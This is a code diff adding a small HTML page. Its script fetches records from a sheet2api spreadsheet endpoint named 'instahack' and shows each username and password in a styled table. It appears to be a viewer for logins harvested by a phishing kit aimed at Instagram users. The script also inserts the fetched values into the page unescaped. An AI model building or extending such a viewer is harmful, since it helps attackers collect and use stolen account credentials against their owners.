@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css"
+        integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    
+</head>
+<body>
+    
+    <div class="container py-5">
+        <table class="table table-bordered table-striped table-dark table-hover">
+            <thead>
+                <tr>
+                    <th>Username</th>
+                    <th>Password</th>
+                </tr>
+            </thead>
+            <tbody>
+                
+            </tbody>
+        </table>
+    </div>
+
+    <script>
+
+let tbody = document.querySelector("tbody")
+var url = 'https://sheet2api.com/v1/JDgMkk5EQtaC/instahack/Sayfa1';
+
+fetch(url)
+  .then(response => response.json())
+  .then(data => {
+      console.log(data);
+      data.map(e=> {
+        tbody.innerHTML += `
+
+        <tr>
+            <td>${e.username}</td>
+            <td>${e.password}</td>
+        </tr>
+        
+        `
+      })
+  })
+  .catch((error) => {
+    console.error('Error:', error);
+  });
+
+    </script>
+</body>
+</html>
